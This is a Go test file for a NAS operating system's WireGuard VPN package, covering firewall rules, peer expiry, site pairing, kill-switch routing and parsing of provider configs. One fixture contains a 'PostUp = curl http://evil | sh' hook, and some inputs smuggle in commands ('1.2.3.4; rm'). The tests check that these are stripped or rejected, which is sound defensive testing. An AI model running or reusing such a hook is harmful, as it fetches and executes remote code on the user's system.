package vpn

import (
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"strataos/internal/store"
)

func testServer(t *testing.T) store.VPN {
	t.Helper()
	priv, pub, _ := GenKey()
	c := store.VPN{Enabled: true, Endpoint: "nas.example.org", LAN: "192.168.1.0/24", PrivateKey: priv, PublicKey: pub}
	if err := Validate(&c); err != nil {
		t.Fatal(err)
	}
	return c
}

func addPeer(t *testing.T, c *store.VPN, owner, name string, pol Policy, site bool) store.VPNPeer {
	t.Helper()
	p, err := NewPeer(*c, owner, name, pol.Mode)
	if err != nil {
		t.Fatal(err)
	}
	if site {
		p.Kind = "site"
	}
	if err := SetPolicy(*c, &p, pol); err != nil {
		t.Fatal(err)
	}
	c.Peers = append(c.Peers, p)
	return p
}

func TestServices(t *testing.T) {
	got, err := ValidateServices([]string{"SMB", " web", "tcp/8080", "udp/5000-5010", "smb", ""})
	if err != nil || !slices.Equal(got, []string{"smb", "web", "tcp/8080", "udp/5000-5010"}) {
		t.Fatalf("%v %v", got, err)
	}
	for _, bad := range []string{"tcp/0", "tcp/70000", "udp/10-5", "icmp/1", "smb; drop", "tcp/80,443"} {
		if _, err := ValidateServices([]string{bad}); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
	tcp, udp := ports([]string{"smb", "tcp/8080", "dns"})
	if !slices.Equal(tcp, []string{"139", "445", "8080", "53"}) || !slices.Equal(udp, []string{"53"}) {
		t.Errorf("ports %v %v", tcp, udp)
	}
}

func TestFirewallPerPeer(t *testing.T) {
	c := testServer(t)
	smb := addPeer(t, &c, "alice", "Phone", Policy{Mode: "nas", Services: []string{"smb"}}, false)
	lan := addPeer(t, &c, "", "Laptop", Policy{Mode: "lan"}, false)
	all := addPeer(t, &c, "", "Travel", Policy{Mode: "all", Services: []string{"web", "udp/53"}}, false)
	site := addPeer(t, &c, "", "Office", Policy{Subnets: []string{"192.168.77.0/24"}}, true)
	fw := RenderFirewall(c)
	for _, want := range []string{
		"table inet strata_wg {",
		`iifname "strata" jump peers`,
		"ip saddr " + smb.IP + " drop\n", // NAS only: nothing forwarded
		"ip saddr " + lan.IP + " ip daddr != { 192.168.1.0/24, 192.168.77.0/24 } drop",
		"ip saddr " + smb.IP + " jump p0",
		"tcp dport { 139, 445 } accept",
		"ip saddr " + all.IP + " jump p1",
		"tcp dport { 80, 443, 7070, 7443 } accept",
		"udp dport { 53 } accept",
		"ip saddr { " + site.IP + ", 192.168.77.0/24 } ip daddr != { 10.8.0.0/24, 192.168.1.0/24 } drop",
		`ip saddr { 10.8.0.0/24, 192.168.77.0/24 } oifname != { "strata" } masquerade`,
	} {
		if !strings.Contains(fw, want) {
			t.Errorf("firewall lacks %q\n%s", want, fw)
		}
	}
	if strings.Contains(fw, "ip saddr "+all.IP+" drop") || strings.Contains(fw, "ip saddr "+lan.IP+" jump") {
		t.Errorf("unexpected rule\n%s", fw)
	}
	// The access mode comes before the services (which accept).
	if strings.Index(fw, "jump reach") > strings.Index(fw, `iifname "strata" jump peers`+"\n  }") && strings.Index(fw, "jump reach") > strings.LastIndex(fw, "jump peers") {
		t.Error("access mode checked after the services")
	}
	// Disabled peers have no rule and no access.
	c.Peers[0].Disabled = true
	if fw := RenderFirewall(c); strings.Contains(fw, smb.IP) || strings.Contains(RenderServer(c), smb.PublicKey) {
		t.Error("disabled peer still configured")
	}
	if RenderFirewall(store.VPN{Subnet: "10.8.0.0/24"}) != "" {
		t.Error("firewall without VPN")
	}
}

func TestExpiryAndOwners(t *testing.T) {
	c := testServer(t)
	now := time.Date(2026, 10, 21, 12, 0, 0, 0, time.UTC)
	a := addPeer(t, &c, "alice", "A", Policy{Mode: "nas"}, false)
	b := addPeer(t, &c, "bob", "B", Policy{Mode: "nas"}, false)
	c.Peers[0].Expires = now.Add(-time.Minute)
	c.Peers[1].Expires = now.Add(time.Hour)
	ok := func(u string) bool { return u == "alice" }
	if Active(c.Peers[0], now, ok) || Active(c.Peers[1], now, ok) {
		t.Error("expired or disabled owner's device active")
	}
	if !Active(c.Peers[1], now, func(string) bool { return true }) {
		t.Error("device of an enabled owner inactive")
	}
	eff := Effective(c, now, ok)
	if !eff.Peers[0].Disabled || !eff.Peers[1].Disabled || c.Peers[0].Disabled {
		t.Error("effective configuration")
	}
	gone := Expire(&c, now)
	if len(gone) != 1 || gone[0].ID != a.ID || !c.Peers[0].Disabled || !c.Peers[0].Expired || c.Peers[1].Disabled {
		t.Errorf("expire %v", gone)
	}
	if len(Expire(&c, now)) != 0 {
		t.Error("expired twice")
	}
	// A new date in the future gives the access back.
	if err := SetPolicy(c, &c.Peers[0], Policy{Mode: "nas", Expires: "2999-01-01"}); err != nil || c.Peers[0].Disabled || c.Peers[0].Expired {
		t.Errorf("renewed: %v %+v", err, c.Peers[0])
	}
	if d, _ := ParseExpiry("2026-12-31"); d.Day() != 1 || d.Month() != 1 {
		t.Errorf("end of day %v", d)
	}
	if _, err := ParseExpiry("tomorrow"); err == nil {
		t.Error("bad date accepted")
	}
	// Names are unique per owner.
	if _, err := NewPeer(c, "bob", "a", ""); err != nil {
		t.Error(err)
	}
	if _, err := NewPeer(c, "bob", "b", ""); err == nil {
		t.Errorf("duplicate name of %s accepted", b.Owner)
	}
	if p, _ := NewPeer(c, "bob", "C", ""); p.Mode != "lan" {
		t.Errorf("default mode %q", p.Mode)
	}
}

func TestSites(t *testing.T) {
	c := testServer(t)
	site := addPeer(t, &c, "", "Office", Policy{Subnets: []string{"192.168.77.1/24", "10.20.0.0/16"}, Endpoint: "office.example.org:51821"}, true)
	if !slices.Equal(site.Subnets, []string{"192.168.77.0/24", "10.20.0.0/16"}) || site.Keepalive != 25 {
		t.Errorf("site %+v", site)
	}
	srv := RenderServer(c)
	for _, want := range []string{"AllowedIPs = " + site.IP + "/32, 192.168.77.0/24, 10.20.0.0/16", "Endpoint = office.example.org:51821", "PersistentKeepalive = 25", "FwMark = 0xcb20"} {
		if !strings.Contains(srv, want) {
			t.Errorf("server lacks %q\n%s", want, srv)
		}
	}
	for _, bad := range [][]string{{"192.168.1.0/25"}, {"10.8.0.0/16"}, {"192.168.77.128/25"}, {"0.0.0.0/0"}, {"fd00::/64"}, {}} {
		p, _ := NewPeer(c, "", "X", "")
		p.Kind = "site"
		if err := SetPolicy(c, &p, Policy{Subnets: bad}); err == nil {
			t.Errorf("subnets %v accepted", bad)
		}
	}
	// Devices in "lan" mode reach the sites too.
	lan := addPeer(t, &c, "", "Laptop", Policy{Mode: "lan"}, false)
	if cl := RenderClient(c, lan); !strings.Contains(cl, "AllowedIPs = 10.8.0.0/24, 192.168.1.0/24, 192.168.77.0/24, 10.20.0.0/16") {
		t.Errorf("client %s", cl)
	}
	r := RenderRouter(c, site, "strata-vm")
	for _, want := range []string{"[Interface]\nPrivateKey = " + site.PrivateKey + "\nAddress = " + site.IP + "/32\nListenPort = 51821", "Endpoint = nas.example.org:51820", "AllowedIPs = 10.8.0.0/24, 192.168.1.0/24", "PresharedKey = " + site.PresharedKey, "/interface wireguard peers add", "/ip route add dst-address=192.168.1.0/24 gateway=wg-strata"} {
		if !strings.Contains(r, want) {
			t.Errorf("router config lacks %q\n%s", want, r)
		}
	}
	// Pairing with another StrataOS (192.168.2.0/24, VPN 10.9.0.0/24).
	code, err := PairingCode(c, site, "Main NAS")
	if err != nil || !strings.HasPrefix(code, "strataos-site:") {
		t.Fatal(code, err)
	}
	other := store.VPN{Enabled: true, Subnet: "10.9.0.0/24", Port: 51820, LAN: "192.168.2.0/24"}
	pr, err := ParsePairing(" " + code[:20] + "\n" + code[20:])
	if err != nil {
		t.Fatal(err)
	}
	l, err := NewLink(other, pr, "")
	if err != nil {
		t.Fatal(err)
	}
	if l.Name != "Main NAS" || l.Iface != "strata-l1" || l.Address != site.IP+"/32" || l.ListenPort != 51821 || l.PeerPublicKey != c.PublicKey || l.Endpoint != "nas.example.org:51820" {
		t.Errorf("link %+v", l)
	}
	if err := ValidateLink(other, l); err != nil {
		t.Error(err)
	}
	conf := RenderLink(l)
	for _, want := range []string{"Address = " + site.IP + "/32", "ListenPort = 51821", "AllowedIPs = 10.8.0.0/24, 192.168.1.0/24", "Endpoint = nas.example.org:51820"} {
		if !strings.Contains(conf, want) {
			t.Errorf("link lacks %q\n%s", want, conf)
		}
	}
	other.Links = append(other.Links, l)
	if _, err := NewLink(other, pr, ""); err == nil {
		t.Error("site imported twice")
	}
	if fw := RenderFirewall(other); !strings.Contains(fw, `iifname "strata-l1" ip daddr != { 192.168.2.0/24, 10.9.0.0/24 } drop`) || !strings.Contains(fw, `oifname != { "strata", "strata-l1" }`) {
		t.Errorf("link firewall\n%s", fw)
	}
	same := store.VPN{Enabled: true, Subnet: "10.8.0.0/24"}
	if _, err := NewLink(same, pr, ""); err == nil {
		t.Error("overlapping VPN networks accepted")
	}
	for _, bad := range []string{"", "strataos-site:", "strataos-site:!!", "nope:" + code[14:]} {
		if _, err := ParsePairing(bad); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
}

func TestRoutePlan(t *testing.T) {
	cur := "10.8.0.0/24 proto kernel scope link src 10.8.0.1\n10.8.0.2 scope link\n192.168.50.0/24 scope link\n192.168.77.0/24 scope link\n"
	add, del := routePlan(cur, []string{"192.168.77.0/24", "10.20.0.0/16"}, "10.8.0.0/24")
	if !slices.Equal(add, []string{"10.20.0.0/16"}) || !slices.Equal(del, []string{"192.168.50.0/24"}) {
		t.Errorf("add %v del %v", add, del)
	}
}

const providerConf = `# Provider export
[Interface]
PrivateKey = %s
Address = 10.66.0.2/32, fd00:66::2/128
DNS = 10.66.0.1, vpn.example
MTU = 1380
PostUp = curl http://evil | sh

[Peer]
PublicKey = %s
PresharedKey = %s
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 15
`

func TestClientConf(t *testing.T) {
	k1, k2, _ := GenKey()
	k3, _, _ := GenKey()
	conf := providerConf
	for _, k := range []string{k1, k2, k3} {
		conf = strings.Replace(conf, "%s", k, 1)
	}
	cl, warn, err := ParseClientConf(conf)
	if err != nil {
		t.Fatal(err)
	}
	if cl.PrivateKey != k1 || cl.PeerPublicKey != k2 || cl.PresharedKey != k3 || !slices.Equal(cl.Addresses, []string{"10.66.0.2/32", "fd00:66::2/128"}) || !slices.Equal(cl.AllowedIPs, []string{"0.0.0.0/0", "::/0"}) || cl.Endpoint != "vpn.example.com:51820" || cl.MTU != 1380 || cl.Keepalive != 15 || len(cl.DNS) != 2 {
		t.Errorf("parsed %+v", cl)
	}
	if !slices.ContainsFunc(warn, func(w string) bool { return strings.Contains(w, "postup") }) || slices.ContainsFunc(warn, func(w string) bool { return strings.Contains(w, "IPv6") }) {
		t.Errorf("warnings %v", warn)
	}
	if !TunnelHasIPv6(cl) || TunnelIP6(cl) != "fd00:66::2" || TunnelIP(cl) != "10.66.0.2" {
		t.Errorf("IPv6 of the tunnel %+v", cl)
	}
	if _, warn, _ := ParseClientConf(strings.Replace(conf, ", ::/0", "", 1)); !slices.ContainsFunc(warn, func(w string) bool { return strings.Contains(w, "IPv6 is blocked") }) {
		t.Errorf("no IPv6 allowed IPs: warnings %v", warn)
	}
	out := RenderClientTunnel(cl)
	if strings.Contains(out, "PostUp") || !strings.Contains(out, "Table = off") || !strings.Contains(out, "FwMark = 0xcb20") || !strings.Contains(out, "AllowedIPs = 0.0.0.0/0, ::/0") ||
		!strings.Contains(out, "Address = 10.66.0.2/32, fd00:66::2/128") || !strings.Contains(out, "Endpoint = vpn.example.com:51820") {
		t.Errorf("tunnel\n%s", out)
	}
	bad := map[string]string{
		"no peer":      strings.Split(conf, "[Peer]")[0],
		"two peers":    conf + "\n[Peer]\nPublicKey = " + k2 + "\n",
		"bad key":      strings.Replace(conf, k1, "abc", 1),
		"bad endpoint": strings.Replace(conf, "vpn.example.com:51820", "vpn.example.com", 1),
		"bad address":  strings.Replace(conf, "10.66.0.2/32", "10.66.0.300/32", 1),
		"bad dns":      strings.Replace(conf, "10.66.0.1", "1.2.3.4; rm", 1),
		"ipv6 only":    strings.Replace(conf, "10.66.0.2/32, ", "", 1),
		"not wg":       "hello",
		"newline key":  strings.Replace(conf, "MTU = 1380", "MTU = 1380\x07", 1),
	}
	for name, txt := range bad {
		if _, _, err := ParseClientConf(txt); err == nil {
			t.Errorf("%s accepted", name)
		}
	}
	cl.Enabled = true
	if err := ValidateClient(store.VPN{Subnet: "10.8.0.0/24", LAN: "192.168.1.0/24"}, &cl); err != nil || cl.Scope != "apps" || cl.AppsSubnet != DefaultAppsSubnet {
		t.Errorf("validate %v %+v", err, cl)
	}
	for _, s := range []string{"192.168.1.0/24", "8.8.8.0/24", "10.0.0.0/8"} {
		x := cl
		x.AppsSubnet = s
		if ValidateClient(store.VPN{Subnet: "10.8.0.0/24", LAN: "192.168.1.0/24"}, &x) == nil {
			t.Errorf("apps network %s accepted", s)
		}
	}
	x := cl
	x.Apps = []string{"qbittorrent", "../x"}
	if ValidateClient(store.VPN{}, &x) == nil {
		t.Error("bad container name accepted")
	}
}

func rules(cmds [][]string) []string {
	var out []string
	for _, c := range cmds {
		out = append(out, strings.Join(c, " "))
	}
	return out
}

func TestClientRouting(t *testing.T) {
	cl := store.VPNClient{Enabled: true, PrivateKey: "k", Addresses: []string{"10.66.0.2/32"}, AllowedIPs: []string{"0.0.0.0/0"}, Scope: "apps", AppsSubnet: "172.31.250.0/24"}
	want := []string{
		"-4 route replace default dev strata-out table 52000",
		"-4 rule add pref 5301 from 10.66.0.2 lookup 52000",
		"-4 rule add pref 5300 from 172.31.250.0/24 lookup main suppress_prefixlength 0",
		"-4 rule add pref 5302 from 172.31.250.0/24 lookup 52000",
	}
	// No IPv6 in the tunnel: none of its rules, whether the NAS has IPv6 or not.
	for _, v6 := range []bool{false, true} {
		if got := rules(ClientRules(cl, v6)); !slices.Equal(got, want) {
			t.Errorf("apps rules (v6 %v)\n%s", v6, strings.Join(got, "\n"))
		}
	}
	// ...but the routed apps' IPv6 goes into the blackhole.
	if got := rules(KillRules(cl, true, 42)); !slices.Equal(got, []string{
		"-4 rule add pref 5303 from 172.31.250.0/24 blackhole",
		"-6 rule add pref 5303 from fd5f:cb20:250::/64 blackhole",
	}) {
		t.Errorf("apps kill rules %v", got)
	}
	if got := rules(KillRules(cl, false, 42)); !slices.Equal(got, []string{"-4 rule add pref 5303 from 172.31.250.0/24 blackhole"}) {
		t.Errorf("apps kill rules without IPv6 %v", got)
	}
	d := DockerDropIn(cl, true)
	if !strings.Contains(d, "ExecStartPre=/usr/sbin/ip -4 rule add pref 5303 from 172.31.250.0/24 blackhole") ||
		!strings.Contains(d, "ExecStartPre=-/usr/sbin/ip -6 rule add pref 5303 from fd5f:cb20:250::/64 blackhole") {
		t.Error(d)
	}
	fw := RenderFirewall(store.VPN{Client: cl})
	if !strings.Contains(fw, `iifname "br-strata-vpn" oifname != { "strata-out", "br-strata-vpn" } ip daddr != { 10.0.0.0/8`) ||
		!strings.Contains(fw, `iifname "br-strata-vpn" oifname != { "br-strata-vpn" } ip6 daddr != { fc00::/7, fe80::/10 } counter drop`) || strings.Contains(fw, "masquerade") {
		t.Errorf("kill switch\n%s", fw)
	}
	cl.Scope = "all"
	if got := rules(ClientRules(cl, true)); !slices.Contains(got, "-4 rule add pref 5302 not fwmark 0xcb20 lookup 52000") || slices.ContainsFunc(got, func(r string) bool { return strings.HasPrefix(r, "-6") }) {
		t.Errorf("all rules %v", got)
	}
	if RenderFirewall(store.VPN{Client: cl}) != "" {
		t.Error("kill switch of the apps in whole-NAS mode")
	}
	if !NeedsForward(store.VPN{Client: cl}) || NeedsForward(store.VPN{}) {
		t.Error("forwarding")
	}
}

func TestClientIPv6(t *testing.T) {
	cl := store.VPNClient{Enabled: true, PrivateKey: "k", Addresses: []string{"10.66.0.2/32", "fd66::2/128"}, AllowedIPs: []string{"0.0.0.0/0", "::/0"}, Scope: "apps", AppsSubnet: "172.31.250.0/24"}
	got := rules(ClientRules(cl, true))
	for _, w := range []string{
		"-6 route replace default dev strata-out table 52000",
		"-6 rule add pref 5301 from fd66::2 lookup 52000",
		"-6 rule add pref 5300 from fd5f:cb20:250::/64 lookup main suppress_prefixlength 0",
		"-6 rule add pref 5302 from fd5f:cb20:250::/64 lookup 52000",
	} {
		if !slices.Contains(got, w) {
			t.Errorf("IPv6 rules lack %q\n%s", w, strings.Join(got, "\n"))
		}
	}
	// A NAS without IPv6: the tunnel loses it.
	if got := rules(ClientRules(cl, false)); slices.ContainsFunc(got, func(r string) bool { return strings.HasPrefix(r, "-6") }) {
		t.Errorf("IPv6 rules without IPv6 %v", got)
	}
	if x := WithoutIPv6(cl); TunnelHasIPv6(x) || !slices.Equal(x.Addresses, []string{"10.66.0.2/32"}) || !slices.Equal(x.AllowedIPs, []string{"0.0.0.0/0"}) || len(cl.Addresses) != 2 {
		t.Errorf("without IPv6 %+v / %+v", x, cl)
	}
	fw := RenderFirewall(store.VPN{Client: cl})
	for _, w := range []string{
		`iifname "br-strata-vpn" oifname != { "strata-out", "br-strata-vpn" } ip6 daddr != { fc00::/7, fe80::/10 } counter drop`,
		`ip6 saddr fd5f:cb20:250::/64 oifname "strata-out" masquerade`,
	} {
		if !strings.Contains(fw, w) {
			t.Errorf("firewall lacks %q\n%s", w, fw)
		}
	}
	// An IPv6 address without IPv6 allowed IPs carries nothing.
	cl.AllowedIPs = []string{"0.0.0.0/0"}
	if TunnelHasIPv6(cl) || strings.Contains(RenderFirewall(store.VPN{Client: cl}), "ip6 saddr") {
		t.Error("IPv6 without allowed IPs")
	}
	if Gateway6() != "fd5f:cb20:250::1" {
		t.Error(Gateway6())
	}
	cl.Scope = "all"
	cl.AllowedIPs = []string{"0.0.0.0/0", "::/0"}
	if got := rules(ClientRules(cl, true)); !slices.Contains(got, "-6 rule add pref 5302 not fwmark 0xcb20 lookup 52000") {
		t.Errorf("whole NAS IPv6 %v", got)
	}
}

func TestWholeNASKillSwitch(t *testing.T) {
	cl := store.VPNClient{Enabled: true, PrivateKey: "k", Addresses: []string{"10.66.0.2/32"}, AllowedIPs: []string{"0.0.0.0/0"}, Scope: "all"}
	got := rules(KillRules(cl, true, 42))
	want := []string{
		"-4 rule add pref 5298 lookup main suppress_prefixlength 0",
		"-4 rule add pref 5298 to 10.0.0.0/8 lookup main",
		"-4 rule add pref 5298 to 172.16.0.0/12 lookup main",
		"-4 rule add pref 5298 to 192.168.0.0/16 lookup main",
		"-4 rule add pref 5298 to 100.64.0.0/10 lookup main",
		"-4 rule add pref 5298 to 169.254.0.0/16 lookup main",
		"-4 rule add pref 5305 not fwmark 0xcb20 blackhole",
		"-6 rule add pref 5298 lookup main suppress_prefixlength 0",
		"-6 rule add pref 5298 to fc00::/7 lookup main",
		"-6 rule add pref 5298 to fe80::/10 lookup main",
		"-6 rule add pref 5305 not fwmark 0xcb20 blackhole",
	}
	if !slices.Equal(got, want) {
		t.Errorf("kill rules\n%s", strings.Join(got, "\n"))
	}
	// Updates allowed: APT's account goes around the kill switch, after
	// the tunnel (it still goes through it when it is up).
	cl.AllowUpdates = true
	got = rules(KillRules(cl, false, 42))
	if i := slices.Index(got, "-4 rule add pref 5304 uidrange 42-42 lookup main"); i < 0 || got[i+1] != "-4 rule add pref 5305 not fwmark 0xcb20 blackhole" || len(got) != 8 {
		t.Errorf("updates allowed\n%s", strings.Join(got, "\n"))
	}
	if got := rules(KillRules(cl, false, -1)); slices.ContainsFunc(got, func(r string) bool { return strings.Contains(r, "uidrange") }) {
		t.Error("uidrange without APT account")
	}
	// At boot: the exemptions before the blackhole, no ignored failure.
	u := KillSwitchUnit(cl, true, 42)
	local := strings.Index(u, "ExecStart=/usr/sbin/ip -4 rule add pref 5298 lookup main suppress_prefixlength 0")
	kill := strings.Index(u, "ExecStart=/usr/sbin/ip -4 rule add pref 5305 not fwmark 0xcb20 blackhole")
	if local < 0 || kill < local || strings.Contains(u, "ExecStart=-") || !strings.Contains(u, "Before=network-pre.target") || !strings.Contains(u, "WantedBy=multi-user.target") {
		t.Errorf("unit\n%s", u)
	}
}

func TestRulesMatch(t *testing.T) {
	cl := store.VPNClient{Scope: "all", AllowUpdates: true}
	group := func(fam string, pref int) [][]string {
		var out [][]string
		for _, c := range KillRules(cl, true, 42) {
			if c[0] == fam && c[4] == strconv.Itoa(pref) {
				out = append(out, c)
			}
		}
		return out
	}
	shown := "5298:\tfrom all lookup main suppress_prefixlength 0\n5298:\tfrom all to 10.0.0.0/8 lookup main\n5298:\tfrom all to 172.16.0.0/12 lookup main\n" +
		"5298:\tfrom all to 192.168.0.0/16 lookup main\n5298:\tfrom all to 100.64.0.0/10 lookup main\n5298:\tfrom all to 169.254.0.0/16 lookup main\n"
	if !rulesMatch(shown, group("-4", prioLocal)) {
		t.Error("local rules")
	}
	if rulesMatch(strings.SplitAfterN(shown, "\n", 2)[1], group("-4", prioLocal)) {
		t.Error("missing rule not seen")
	}
	if !rulesMatch("5305:\tnot from all fwmark 0xcb20 blackhole\n", group("-4", prioKillAll)) || !rulesMatch("5304:\tfrom all uidrange 42-42 lookup main\n", group("-6", prioUpdates)) {
		t.Error("kill and updates rules")
	}
	cl.Scope = "apps"
	cl.AppsSubnet = "172.31.250.0/24"
	if !rulesMatch("5303:\tfrom fd5f:cb20:250::/64 blackhole\n", group("-6", prioKill)) || rulesMatch("5303:\tfrom 172.31.0.0/16 blackhole\n", group("-4", prioKill)) || rulesMatch("", group("-4", prioKill)) {
		t.Error("apps rules")
	}
}

func TestSysctlConf(t *testing.T) {
	if c := SysctlConf(false, nil); c != "# Managed by StrataOS: the VPN routes packets.\nnet.ipv4.ip_forward = 1\n" {
		t.Error(c)
	}
	c := SysctlConf(true, []string{"default", "enp1s0"})
	ra, fwd := strings.Index(c, "net.ipv6.conf.enp1s0.accept_ra = 2"), strings.Index(c, "net.ipv6.conf.all.forwarding = 1")
	if ra < 0 || fwd < ra || !strings.Contains(c, "net.ipv6.conf.default.accept_ra = 2") {
		t.Error(c)
	}
}

func TestExpiryWarnings(t *testing.T) {
	now := time.Date(2026, 10, 22, 10, 0, 0, 0, time.Local)
	day := func(d int) time.Time { return time.Date(2026, 10, 22+d, 0, 0, 0, 0, time.Local) }
	c := store.VPN{Peers: []store.VPNPeer{
		{ID: "soon", Name: "Soon", VPNPeerPolicy: store.VPNPeerPolicy{Expires: day(3)}},
		{ID: "edge", Name: "Edge", VPNPeerPolicy: store.VPNPeerPolicy{Expires: now.Add(7 * 24 * time.Hour)}},
		{ID: "later", Name: "Later", VPNPeerPolicy: store.VPNPeerPolicy{Expires: day(8)}},
		{ID: "never", Name: "Never"},
		{ID: "past", Name: "Past", VPNPeerPolicy: store.VPNPeerPolicy{Expires: day(-1)}},
		{ID: "off", Name: "Off", Disabled: true, VPNPeerPolicy: store.VPNPeerPolicy{Expires: day(1)}},
	}}
	ids := func(ps []store.VPNPeer) []string {
		var out []string
		for _, p := range ps {
			out = append(out, p.ID)
		}
		return out
	}
	if got := ids(ExpiringSoon(&c, now)); !slices.Equal(got, []string{"soon", "edge"}) {
		t.Errorf("first pass %v", got)
	}
	if got := ExpiringSoon(&c, now.Add(time.Hour)); len(got) != 0 {
		t.Errorf("warned twice %v", ids(got))
	}
	if got := ids(ExpiringSoon(&c, day(2))); !slices.Equal(got, []string{"later"}) {
		t.Errorf("two days later %v", got)
	}
	// A new date warns again.
	c.Peers[0].Expires = day(5)
	if got := ids(ExpiringSoon(&c, day(2))); !slices.Equal(got, []string{"soon"}) {
		t.Errorf("new date %v", got)
	}
	c.Peers[0].Expires = day(6)
	c.ExpiryWarnDays = -1
	if got := ExpiringSoon(&c, day(2)); len(got) != 0 || WarnDays(c) != 0 {
		t.Error("warnings off")
	}
	c.ExpiryWarnDays = 1
	if got := ExpiringSoon(&c, day(2)); len(got) != 0 {
		t.Error("1 day: too early")
	}
	if got := ids(ExpiringSoon(&c, day(5).Add(time.Hour))); !slices.Equal(got, []string{"soon"}) {
		t.Errorf("1 day %v", got)
	}
	if LastDay(c.Peers[0]) != "2026-10-27" {
		t.Error(LastDay(c.Peers[0]))
	}
	for _, bad := range []int{-2, 366} {
		x := store.VPN{ExpiryWarnDays: bad}
		if Validate(&x) == nil {
			t.Errorf("%d days accepted", bad)
		}
	}
}
